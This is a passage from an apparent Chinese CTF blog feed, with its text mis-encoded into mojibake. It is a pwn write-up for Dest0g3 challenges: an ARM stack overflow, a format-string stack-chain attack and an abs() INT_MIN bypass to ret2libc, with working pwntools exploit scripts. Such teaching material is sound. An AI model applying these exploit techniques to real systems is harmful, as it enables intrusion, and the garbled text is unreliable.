¹å°±æ²¡æŒ‡å®šç«¯å£ï¼Œå°±ç›´æ¥è¾“å…¥äº†ä¸ª1000ï¼‰ï¼Œå‚æ•°væ˜¯è¯¦ç»†æ‰“å°</strong>ï¼ˆä¸€ä¸ªvæ˜¯ç¨å¾®è¯¦ç»†ï¼Œä¸¤ä¸ªvæ˜¯æ˜¾ç¤ºçš„æ›´è¯¦ç»†ï¼Œä¸çŸ¥é“è¿™ä¸ªè¯¦ç»†å’Œæ›´è¯¦ç»†æ˜¯å•¥æ„æ€çš„è¯ï¼Œè‡ªå·±è¯•è¯•å°±çŸ¥é“äº†ï¼‰</p><p>è¿™æ˜¯æ­£å¸¸çš„æƒ…å†µ<br><img src="/../img/2706180-20220426102540992-803595367.png"></p>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> orw </tag>
            
            <tag> shellcode </tag>
            
            <tag> magic_gadget </tag>
            
            <tag> socket+connect </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dest0g3 520è¿æ–°èµ›--æ ˆé¢˜write_up</title>
      <link href="/posts/4354d4bf.html"/>
      <url>/posts/4354d4bf.html</url>
      
        <content type="html"><![CDATA[<h2 id="ez-aarch"><a href="#ez-aarch" class="headerlink" title="ez_aarch"></a>ez_aarch</h2><h3 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h3><p>è€ƒå¯Ÿçš„æ˜¯æœ€ç®€å•çš„armæ¶æ„çš„æ ˆæº¢å‡ºã€‚</p><h3 id="ä¿æŠ¤ç­–ç•¥"><a href="#ä¿æŠ¤ç­–ç•¥" class="headerlink" title="ä¿æŠ¤ç­–ç•¥"></a>ä¿æŠ¤ç­–ç•¥</h3><img src="https://s2.loli.net/2022/05/27/wCtDTAO95cxIy61.png" alt="image-20220524111202855" style="zoom:33%;" /><p>å…³äºarmæ¶æ„æ˜¯æ€ä¹ˆå¯åŠ¨ç¨‹åºå’Œè°ƒè¯•çš„ï¼Œå¯ä»¥å‚è€ƒä¸€ä¸‹æˆ‘çš„è¿™ç¯‡<a href="https://www.cnblogs.com/ZIKH26/articles/16077191.html">åšå®¢</a></p><img src="https://s2.loli.net/2022/05/27/hEBHxi1TcwblWUr.png" alt="image-20220524113235409" style="zoom:50%;" /><p>è¿™é‡Œå­˜åœ¨æº¢å‡ºï¼ŒåŒæ—¶é¢˜ç›®ç»™äº†åé¢ï¼Œå¹¶ä¸”å¾ˆå·§åˆçš„æ²¡å¼€canaryï¼Œå› æ­¤è¿™å°±æ˜¯æœ€ç®€å•çš„æ ˆæº¢å‡ºé¢˜ç›®ï¼Œä¸è¿‡è€ƒè™‘åˆ°è¿™æ˜¯armæ¶æ„çš„é¢˜ç›®è·Ÿx86çš„å‡½æ•°è°ƒç”¨è¿˜ä¸å¤ªä¸€æ ·ï¼Œæ²¡æ³•ä¸€çœ¼å°±çœ‹å‡ºå®ƒçš„è¿”å›åœ°å€ï¼Œéœ€è¦è°ƒè¯•ä¸€ä¸‹ã€‚</p><p><img src="https://s2.loli.net/2022/05/27/oMrNmXEPvBVdSeh.png" alt="image-20220524124829771"></p><p>å…ˆç”¨cyclicç”Ÿæˆ48ä¸ªå­—ç¬¦ï¼Œç„¶åä¸‹ä¸ªæ–­ç‚¹åˆ°0x40000009c8ï¼Œcè¿‡å»çœ‹ä¸€ä¸‹å´©æºƒçš„ä¿¡æ¯ã€‚</p><p><img src="https://s2.loli.net/2022/05/27/liJ8YSZTKU7Ep4B.png" alt="image-20220524125046601"></p><p>å‘ç°æ˜¯åœ¨kaaalaaaè¿™é‡Œå´©æºƒäº†ï¼ˆå› ä¸ºæ­¤æ—¶çš„x30å¯„å­˜å™¨å°±æ˜¯è¿™ä¸ªå€¼ï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æŠŠè¿™ä¸ªåœ°æ–¹çš„å†…å®¹æ¢æˆåé—¨å‡½æ•°çš„åœ°å€å³å¯ã€‚ç”±äºå¼€äº†PIEï¼Œæˆ‘ä»¬æ— æ³•å†™å…¥åé¢å‡½æ•°æ•´ä¸ªçš„åœ°å€ï¼Œä¸è¿‡å¯ä»¥åªå†™åé—¨å‡½æ•°çš„æœ€åä¸€å­—èŠ‚ï¼Œå†™ä¸ª0x3cå³å¯ã€‚</p><p><img src="https://s2.loli.net/2022/05/27/oUrikO5lxtX34eD.png" alt="image-20220524125339086"></p><h3 id="EXPï¼š"><a href="#EXPï¼š" class="headerlink" title="EXPï¼š"></a>EXPï¼š</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./stack&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28710</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line">payload=<span class="number">40</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;&lt;&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/05/27/Nd52ZPUytiEfYrb.png" alt="image-20220524125717811" style="zoom:33%;" /><h2 id="dest-love"><a href="#dest-love" class="headerlink" title="dest_love"></a>dest_love</h2><p>æ€»ç»“ï¼š</p><p>1ã€è€ƒå¯Ÿçš„bssæ®µä¸Šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œè¿™é“é¢˜å±äºæœ€ç®€å•çš„å¸ƒç½®æ ˆé“¾</p><p>2ã€ä»¥ååšé¢˜ä¹‹å‰å°½é‡æŠŠlibcç‰ˆæœ¬æ‰¾æ­£ç¡®äº†ï¼Œè¿™é“é¢˜çš„libcè¯•äº†åŠå¤©æœ€åè¯•å‡ºæ¥äº†ï¼Œç»“æœåšå‡ºæ¥ä¹‹åå‘ç°å…¬å‘Šä¸Šå†™äº†æ˜¯ubuntu21.04ï¼Œä¸ç„¶è¿˜èƒ½åšçš„æ›´å¿«ã€‚</p><h3 id="ä¿æŠ¤ç­–ç•¥ï¼š"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h3><img src="https://s2.loli.net/2022/05/27/VxYJs8WM9wqFRQN.png" alt="image-20220524130642814" style="zoom:33%;" /><h3 id="ç¨‹åºåˆ†æï¼š"><a href="#ç¨‹åºåˆ†æï¼š" class="headerlink" title="ç¨‹åºåˆ†æï¼š"></a>ç¨‹åºåˆ†æï¼š</h3><img src="https://s2.loli.net/2022/05/27/J4TjCPa8QM5fgOS.png" alt="image-20220524130844091" style="zoom: 33%;" /><p>è€ƒå¯Ÿçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼ŒåŒæ—¶å­˜åœ¨åé—¨å‡½æ•°ã€‚</p><p>ç›®å‰æŒæ¡çš„ä¿¡æ¯æ˜¯ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åªèƒ½ç”¨6æ¬¡ï¼ŒåŒæ—¶formatæ˜¯è¾“å…¥åˆ°äº†bssæ®µï¼Œå¼€äº†PIEã€‚</p><h3 id="å¤§è‡´æ€è·¯ï¼š"><a href="#å¤§è‡´æ€è·¯ï¼š" class="headerlink" title="å¤§è‡´æ€è·¯ï¼š"></a>å¤§è‡´æ€è·¯ï¼š</h3><p>å› ä¸ºè¿™é“é¢˜æ˜¯bssæ®µçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå› æ­¤éœ€è¦å¸ƒç½®æ ˆé“¾æ¥åšï¼Œå…³äºæ ˆé“¾çš„å¸ƒç½®å¯ä»¥å‚è€ƒæˆ‘çš„è¿™ç¯‡<a href="https://www.cnblogs.com/ZIKH26/articles/16167705.html">åšå®¢</a></p><p>ä¸è¿‡åœ¨è¿™ä¹‹å‰è¿™é“é¢˜æœ‰ä¸€ä¸ªå¾ˆæ¶å¿ƒçš„åœ°æ–¹ï¼Œå°±æ˜¯éœ€è¦çŒœä¸€ä¸‹libcï¼ˆå…¶å®ä¹Ÿä¸ç”¨çŒœï¼Œå…¬å‘Šé‡Œç»™äº†ubuntu21.04çš„ç‰ˆæœ¬ï¼‰ä¸è¿‡æˆ‘å½“æ—¶åšé¢˜çš„æ—¶å€™æ²¡æœ‰çœ‹å…¬å‘Šï¼Œç„¶åå°±ä¸€ä¸ªä¸€ä¸ªè¯•äº†ä¸€ä¸‹ï¼Œè¯•çš„æ–¹æ³•å°±æ˜¯ncè¿æ¥åˆ°æœåŠ¡å™¨é‚£è¾¹çš„ç¨‹åºï¼Œç„¶åè¾“å…¥å¾ˆå¤šä¸ª%pï¼Œçœ‹ä¸€ä¸‹æ³„éœ²æ•°æ®èƒ½å¦å’Œæœ¬åœ°çš„æ•°æ®ç±»å‹å¯¹åº”ï¼ˆæ¯”å¦‚è¿œç¨‹æ ˆé¡¶åç§»8çš„ä½ç½®æ˜¯ä¸ªlibcä¸­åœ°å€ï¼Œå½“æœ¬åœ°çš„æ ˆé¡¶åç§»8çš„ä½ç½®ä¹Ÿæ˜¯ä¸ªlibcåœ°å€å°±ç®—æ˜¯å¯¹åº”ï¼‰</p><p>æœ€åè¯•å‡ºæ¥æ˜¯2.33çš„libcã€‚åœ¨ubuntu21.04çš„dockeré‡Œè·‘ä¸€ä¸‹ã€‚ï¼ˆå¦‚æœåˆæ­¥å­¦ä¹ æ€ä¹ˆä½¿ç”¨dockerçš„å¯ä»¥çœ‹è¿™ç¯‡<a href="https://www.cnblogs.com/ZIKH26/articles/16278170.html">æ–‡ç« </a>)</p><h3 id="è°ƒè¯•è¿‡ç¨‹ï¼š"><a href="#è°ƒè¯•è¿‡ç¨‹ï¼š" class="headerlink" title="è°ƒè¯•è¿‡ç¨‹ï¼š"></a>è°ƒè¯•è¿‡ç¨‹ï¼š</h3><p>åœ¨å¸ƒç½®æ ˆé“¾ä¹‹å‰ï¼Œå…ˆå»æ³„éœ²ä¸€ä¸‹æˆ‘ä»¬éœ€è¦çš„åœ°å€ï¼Œ<strong>å¯¹æŠ—PIEéœ€è¦ç”¨ç¨‹åºåŸºåœ°å€ï¼Œå¸ƒç½®æ ˆé“¾éœ€è¦ç”¨æ ˆåœ°å€</strong>ï¼Œè°ƒè¯•ä¸€ä¸‹ï¼Œçœ‹çœ‹æ ˆé‡Œçš„æ•°æ®ã€‚</p><p>ä¸‹é¢æ˜¯æ‰§è¡Œprintfæ—¶çš„æ ˆä¸­æƒ…å†µã€‚</p><p><img src="https://s2.loli.net/2022/05/27/VUkdBPYgJuftAzZ.png" alt="image-20220524190605046"></p><p>ç”±æ­¤å¯ä»¥è·å–æ‰€éœ€åœ°å€çš„åç§»ï¼Œåˆ†åˆ«æ˜¯4å’Œ8ï¼ˆä¸è¿‡éœ€è¦åŠ ä¸Š6ä¸ªå¯„å­˜å™¨ï¼‰ï¼Œæ³„éœ²å‡ºæ¥ä¹‹åï¼Œå‡å»å¯¹åº”çš„åç§»ï¼Œå³å¯è·å–ç¨‹åºåŸºåœ°å€å’Œæ‰€éœ€æ ˆåœ°å€ã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯å¸ƒç½®æ ˆé“¾ã€‚</p><p>å…ˆåœ¨æ ˆä¸­æ‰¾ä¸€ä¸ªæ ˆåœ°å€ï¼ˆè¿™ä¸ªæ ˆåœ°å€éœ€è¦å†æŒ‡å‘ä¸€ä¸ªæ ˆåœ°å€ï¼‰ï¼Œ<strong>å¾ˆæ˜æ˜¾ç¬¦åˆè¿™ä¸ªæ¡ä»¶çš„æ˜¯æ ˆé¡¶åç§»4çš„ä½ç½®</strong>ï¼Œç”±äºæˆ‘ä»¬çš„ç›®çš„æ˜¯åœ¨è¿™ä¸ªåœ°æ–¹å†™å…¥è¿™ä¸ªå€¼ï¼ˆè§ä¸‹å›¾ï¼‰</p><p><img src="https://s2.loli.net/2022/05/27/zUnZm6B8Q1fDTrp.png" alt="image-20220524191227999"></p><p>æ‰€ä»¥éœ€è¦æŠŠè¿™ä¸ªdword_4010å†™åˆ°æ ˆé‡Œã€‚è€ƒè™‘åˆ°ç¨‹åºåŸºåœ°å€å’Œåç§»8çš„æ ˆä¸­å†…å®¹çš„å‰å››å­—èŠ‚ä¸€æ ·ï¼Œå› æ­¤åˆ©ç”¨ä¸€ä¸‹åç§»8çš„æ•°æ®ï¼Œå…ˆå°†åç§»4çš„å†…å®¹æŒ‡å‘çš„å€¼å»ä¿®æ”¹ä¸ºåç§»8çš„æ ˆåœ°å€ã€‚</p><img src="https://s2.loli.net/2022/05/27/32oN5BtSmJwz6qD.png" alt="image-20220524194519354" style="zoom:33%;" /><img src="https://s2.loli.net/2022/05/27/gQbT3v5t4nJlsLI.png" alt="image-20220524194437287" style="zoom:33%;" /><p>æ­¤æ—¶å†é€šè¿‡0x7ffcc75c1504è¿™ä¸ªåœ°å€æ¥ä¿®æ”¹å…¶æŒ‡å‘çš„å€¼ï¼Œåªéœ€è¦æ›´æ”¹ä½ä¸¤å­—èŠ‚å³å¯ã€‚</p><pre><code>    æ­¤æ—¶å¯ä»¥çœ‹è§ï¼Œæˆ‘ä»¬å·²ç»æŠŠæˆ‘ä»¬è¦ä¿®æ”¹å†…å®¹çš„åœ°å€ç»™å†™åˆ°æ ˆé‡Œäº†ã€‚</code></pre><p>æ¥ä¸‹æ¥ï¼Œåœ¨è·ç¦»æ ˆé¡¶åç§»8è¿™ä¸ªä½ç½®ç›´æ¥å†™å…¥è¦ä¿®æ”¹çš„æ•°æ®å³å¯ã€‚</p><p>è¿™ä¸ªå±äºæœ€ç®€å•çš„å¸ƒç½®æ ˆé“¾äº†ï¼Œå¦‚æœç†Ÿæ‚‰æ•´ä½“æµç¨‹çš„è¯ï¼Œåº”è¯¥åšèµ·æ¥è¿˜æ˜¯æ¯”è¾ƒè½»æ¾çš„ã€‚</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h3><p>ç›´æ¥å¤åˆ¶ç²˜è´´è¿™ä¸ªexpï¼Œæ˜¯æ‰“ä¸é€šçš„ï¼Œå› ä¸ºæˆ‘å†™äº†å‡ ä¸ªå‡½æ•°ï¼Œæ”¾åˆ°äº†toolsè¿™ä¸ªåº“é‡Œé¢ï¼Œå¦‚æœæƒ³ç”¨ä¸‹é¢è¿™ä¸ªè„šæœ¬è·å–shellçš„è¯ï¼Œéœ€è¦å¤åˆ¶ç²˜è´´<a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">è¿™é‡Œçš„æºç </a>æ–°å»ºä¸€ä¸ªåä¸ºtoolsçš„pyæ–‡ä»¶ã€‚æˆ–è€…æŠŠfrom tools import *ä»¥åŠdebugå’Œlogå‡½æ•°è¿™äº›å‡ºç°çš„åœ°æ–¹ç»™æ³¨é‡Šæ‰ä¹Ÿè¡Œã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./b&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./b&#x27;</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x1210</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What about your love to Dest0g3?&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What about your love to Dest0g3?&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What about your love to Dest0g3?&#x27;</span>,<span class="string">&#x27;%14$p%10$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">base_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x1270</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">stack_leak=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">stack_hook=(stack_leak&amp;<span class="number">0xffff</span>)-<span class="number">0xc8</span></span><br><span class="line"></span><br><span class="line">log(<span class="string">&#x27;base_addr&#x27;</span>,<span class="built_in">hex</span>(base_addr))</span><br><span class="line">log(<span class="string">&#x27;stack_leak&#x27;</span>,<span class="built_in">hex</span>(stack_leak))</span><br><span class="line">dest_addr=base_addr+<span class="number">0x4010</span></span><br><span class="line">log(<span class="string">&#x27;dest_addr&#x27;</span>,<span class="built_in">hex</span>(dest_addr))</span><br><span class="line"></span><br><span class="line">log(<span class="string">&#x27;stack_hook&#x27;</span>,<span class="built_in">hex</span>(stack_hook))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack_hook)+<span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What about your love to Dest0g3?&#x27;</span>,payload)</span><br><span class="line">back_door=(base_addr+<span class="number">0x4010</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(back_door)+<span class="string">&#x27;c%39$hn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What about your love to Dest0g3?&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;%1314520c%14$n&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What about your love to Dest0g3?&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/05/27/2B3Osle1RNzFM5o.png" alt="image-20220524195121599" style="zoom:33%;" /><h2 id="ez-pwn"><a href="#ez-pwn" class="headerlink" title="ez_pwn"></a>ez_pwn</h2><h3 id="æ€»ç»“ï¼š-1"><a href="#æ€»ç»“ï¼š-1" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h3><p>1ã€é€šè¿‡è¿™é“é¢˜å¯¹åŸç å’Œè¡¥ç æœ‰äº†æ›´æ·±çš„è®¤è¯†ï¼Œè´Ÿæ•°çš„å€¼&#x3D;å¯¹åº”è¡¥ç -(1&lt;&lt;32) ï¼ˆ32ä½ç¨‹åºï¼‰</p><p>2ã€abså‡½æ•°æ˜¯æœ‰æ¼æ´çš„ï¼Œintç±»å‹çš„èŒƒå›´æ˜¯-2147483648~ 2147483647 ï¼Œè¿™å°±æ„å‘³ç€abså°†-2147483648è½¬åŒ–ä¸ºå¯¹åº”çš„æ­£æ•°æ˜¯æ‰¾ä¸åˆ°å¯¹åº”çš„å€¼ï¼Œå°±ä¼šå‡ºç°é—®é¢˜ã€‚</p><h3 id="ä¿æŠ¤ç­–ç•¥ï¼š-1"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š-1" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h3><img src="https://s2.loli.net/2022/05/27/qUpHdgolmKDJTke.png" alt="image-20220524224426473" style="zoom:50%;" /><h3 id="ç¨‹åºåˆ†æï¼š-1"><a href="#ç¨‹åºåˆ†æï¼š-1" class="headerlink" title="ç¨‹åºåˆ†æï¼š"></a>ç¨‹åºåˆ†æï¼š</h3><img src="https://s2.loli.net/2022/05/27/NA3umiPhdfqplJF.png" alt="image-20220524225032285" style="zoom:33%;" /><p>æˆ‘æœ€å¼€å§‹åˆ†æé¢˜ç›®çš„æ—¶å€™ï¼Œç¡®å®æ²¡æ‰¾åˆ°æ¼æ´ï¼Œå› ä¸ºæ²¡å¼€canaryï¼Œæˆ‘æ€»æ„Ÿè§‰è¿™é“é¢˜æ˜¯èƒ½æº¢å‡ºçš„ï¼Œç„¶ååˆä¸€ç‚¹ä¸€ç‚¹çš„ä»”ç»†åˆ†æï¼Œå‘ç°è¿˜æ˜¯æ²¡å•¥æ¯›ç—…ï¼Œä½†æ˜¯æ ¹æ®ç»éªŒæ¥çœ‹ï¼Œä¸€èˆ¬æ„Ÿè§‰æ²¡æ¼æ´çš„æ—¶å€™ï¼Œæ¼æ´å°±å‡ºç°åœ¨ä¸å¤ªäº†è§£çš„æ–°ä¸œè¥¿ä¸Šé¢ã€‚è¿™é“é¢˜çš„æ¼æ´ç‚¹åœ¨è¿™ä¸ªabså‡½æ•°ä¸Šï¼Œä¸‹é¢æ¥ä»”ç»†åˆ†æä¸€ä¸‹abså‡½æ•°æ¼æ´äº§ç”Ÿçš„åŸç†ã€‚</p><h3 id="abså‡½æ•°æ¼æ´åˆ†æ"><a href="#abså‡½æ•°æ¼æ´åˆ†æ" class="headerlink" title="abså‡½æ•°æ¼æ´åˆ†æ"></a>abså‡½æ•°æ¼æ´åˆ†æ</h3><p>abså‡½æ•°æºç </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>        abs</span></span><br><span class="line"><span class="comment">/* Return the absolute value of I.  */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">abs</span> <span class="params">(<span class="type">int</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> i &lt; <span class="number">0</span> ? -i : i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>abså‡½æ•°çš„ä½œç”¨å°±æ˜¯å–ç»å¯¹å€¼ï¼Œä¹Ÿå°±æ˜¯å°†è´Ÿæ•°è½¬æ¢ä¸ºæ­£æ•°ã€‚ä½†æ˜¯intç±»å‹çš„èŒƒå›´æ˜¯å¤šå°‘ï¼Ÿ-2147483648~ 2147483647 è¿™å°±æ˜¯intçš„èŒƒå›´ï¼Œ<strong>å¯æ˜¯è¿™ä¸ªèŒƒå›´ä¸å¯¹ç§°ï¼Œè¿™å°±æ„å‘³ç€ä½¿ç”¨abså‡½æ•°ï¼Œè¾“å…¥-2147483648 å®ƒå°±æ‰¾ä¸åˆ°å¯¹åº”çš„æ­£å€¼</strong>ã€‚å½“abså‡½æ•°æ‰§è¡Œæ—¶å°±ä¼šå°†-2147483648çš„è´Ÿå·å»æ‰ï¼Œä¸è¿‡å»æ‰è´Ÿå·ä¹‹åæ˜¯2147483648ï¼Œè€Œintç±»å‹çš„èŒƒå›´é‡Œå‹æ ¹å°±æ²¡æœ‰è¿™ä¸ªæ•°å­—ã€‚å¦‚æœå®è·µä¸€ä¸‹å°±ä¼šå‘ç°-2147483648çš„ç»å¯¹å€¼è¿˜æ˜¯-2147483648ã€‚</p><h3 id="å¤§è‡´æ€è·¯ï¼š-1"><a href="#å¤§è‡´æ€è·¯ï¼š-1" class="headerlink" title="å¤§è‡´æ€è·¯ï¼š"></a>å¤§è‡´æ€è·¯ï¼š</h3><p>å› æ­¤æ€è·¯å°±å‡ºæ¥äº†ï¼Œè¾“å…¥-2147483648 ï¼Œç»è¿‡abs()å‡½æ•°åï¼Œè¿”å›çš„ä¾æ—§æ˜¯-2147483648 ï¼Œå¯ä»¥ç»•è¿‡<code>if ( (int)abs32(v2) &gt; 10 )</code>å’Œ<code>if ( v4 &gt;= v2 )</code>ä¸¤ä¸ªæ£€æŸ¥ï¼ˆä¸ºå•¥èƒ½ç»•è¿‡ç¬¬äºŒä¸ªæ£€æŸ¥ï¼Ÿå› ä¸ºv4å’Œv2éƒ½æ˜¯æ— ç¬¦å·æ•´æ•°ï¼Œv2å­˜å‚¨çš„å€¼å°±æ˜¯0x80000000ï¼Œæ‰€ä»¥v4æ˜¯è‚¯å®šæ¯”v2å°ï¼Œç»§è€Œç»•è¿‡æ£€æŸ¥ï¼‰ï¼Œä»è€Œå¯ä»¥ä¸æ–­çš„è§¦å‘<code>__isoc99_scanf(&quot;%d&quot;, &amp;v1[v4++]);</code>è¿™è¡Œä»£ç ï¼Œv4çš„ç´¢å¼•æ²¡æœ‰é™åˆ¶å› æ­¤è¿™é‡Œå°±æ˜¯æº¢å‡ºç‚¹ï¼Œè®©v4è¶³å¤Ÿå¤§ï¼Œæ­£å¥½æŒ‡å‘æ ˆé‡Œv4çš„å€¼ï¼Œç„¶åå»ä¿®æ”¹v4çš„å€¼ï¼Œè®©å…¶æŒ‡å‘è¿”å›åœ°å€ã€‚æ¥ç€å°±å¯ä»¥ç¯¡æ”¹è¿”å›åœ°å€äº†ï¼Œå‰©ä¸‹çš„å°±æ˜¯ret2libcï¼ŒåŠ«æŒç¨‹åºæ‰§è¡Œæµå†æ¥ä¸€éï¼Œæœ€ç»ˆè·å–shellã€‚</p><p>å…¶å®è¿™é“é¢˜è°ƒè¯•ä¸€ä¸‹è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œæˆ‘å°±æ”¾å‡ å¼ å›¾ç‰‡è¯´æ˜ä¸€ä¸‹è¿‡ç¨‹å§ã€‚</p><p>ä¸‹å›¾æ˜¯æ­£åœ¨æº¢å‡º<br><img src="https://s2.loli.net/2022/05/27/rbFmHDZNL4It7Q5.png" alt="image-20220525224818058" style="zoom:50%;" /></p><p><img src="https://s2.loli.net/2022/05/27/jPh2AinCrUdqYkH.png" alt="image-20220525224936710"></p><p><img src="https://s2.loli.net/2022/05/27/CR3lwfp8qysodVN.png" alt="image-20220525225022664"></p><p>æ­¤æ—¶çš„v4è¿™ä¸ªåç§»å°±è®©&amp;v1[v4++]æŒ‡å‘äº†è¿”å›åœ°å€ï¼Œç„¶åä¿®æ”¹è¿”å›åœ°å€ï¼ˆå¦‚ä¸‹å›¾ï¼‰</p><p><img src="https://s2.loli.net/2022/05/27/XzZSq78doOAmspi.png" alt="image-20220525225403369"></p><p>æ¥ç€æŠŠè¿”å›åœ°å€å’Œå‚æ•°å†™å…¥ï¼Œret2libcå³å¯ã€‚</p><h3 id="libcä¸­åœ°å€æ— æ³•ç›´æ¥å†™å…¥å†…å­˜ä¸­"><a href="#libcä¸­åœ°å€æ— æ³•ç›´æ¥å†™å…¥å†…å­˜ä¸­" class="headerlink" title="libcä¸­åœ°å€æ— æ³•ç›´æ¥å†™å…¥å†…å­˜ä¸­"></a>libcä¸­åœ°å€æ— æ³•ç›´æ¥å†™å…¥å†…å­˜ä¸­</h3><p>åé¢çš„è¿‡ç¨‹å°±ä¸å†æ¼”ç¤ºäº†ï¼Œæœ€åå”¯ä¸€çš„ä¸€ä¸ªå‘å°±æ˜¯å†™å…¥systemåœ°å€å’Œ&#x2F;bin&#x2F;shåœ°å€æ—¶ï¼Œç”±äº32ä½ç¨‹åºlibcä¸­çš„åœ°å€æ˜¯0xf7å¼€å¤´ï¼Œä½†æ˜¯è¿™ä¸ªæ•°æ®å¤ªå¤§äº†ï¼Œä¸èƒ½ç›´æ¥ç”¨scanf(%d,&amp;a)å†™å…¥è¿›å»ã€‚</p><p>å‰–æä¸€ä¸‹åŸç†ï¼š</p><blockquote><p>ç”±äºscanfä¼šå¯¹è¾“å…¥çš„å†…å®¹è¿›è¡Œè¿‡æ»¤ï¼Œåªè¦æ˜¯æ­£æ•°ï¼Œé‚£ä¹ˆå­˜åˆ°å†…å­˜é‡Œçš„æœ€å¤§å°±æ˜¯0x7fffffffï¼ˆå› ä¸ºç¬¦å·ä½æ˜¯ä¸èƒ½è¡¨ç¤ºå¤§å°çš„ï¼‰ï¼Œå‡å¦‚ç°åœ¨æƒ³å­˜å…¥0xf7123456ï¼Œæˆ‘ä»¬æ¥å€’æ¨ä¸€ä¸‹ï¼ˆå…ˆä¸ç®¡å®ƒæ˜¯å’‹è¾“å…¥è¿›å»çš„ï¼Œå‡è®¾å®ƒç›´æ¥å­˜åœ¨äºå†…å­˜ä¸­ï¼‰ï¼Œå†…å­˜ä¸­å­˜æ”¾çš„0xf7123456å¯¹åº”äºŒè¿›åˆ¶å°±æ˜¯1111 0111 0001 0010 0011 0100 0101 0110ã€‚</p><p>æˆ‘ä»¬æ¥æ±‚ä¸€ä¸‹ä»–çœŸæ­£çš„å€¼ï¼Œå‘ç°ç¬¦å·ä½æ˜¯1ï¼Œå› æ­¤åˆ¤æ–­å…¶ä¸ºè´Ÿæ•°ï¼Œç„¶åè¦å‡ä¸€ï¼Œæ¥ç€å¯¹æ•´ä½“å–åï¼Œæœ€åè¡¨ç¤ºä¸º0000 1000 1110 1101 1100 1011 1010 1010 å¯¹åº”16è¿›åˆ¶ä¸º0x8EDCBAA å› ä¸ºå®ƒå½“æˆçš„è¡¥ç ç¬¦å·ä½ä¸º1ï¼Œå› 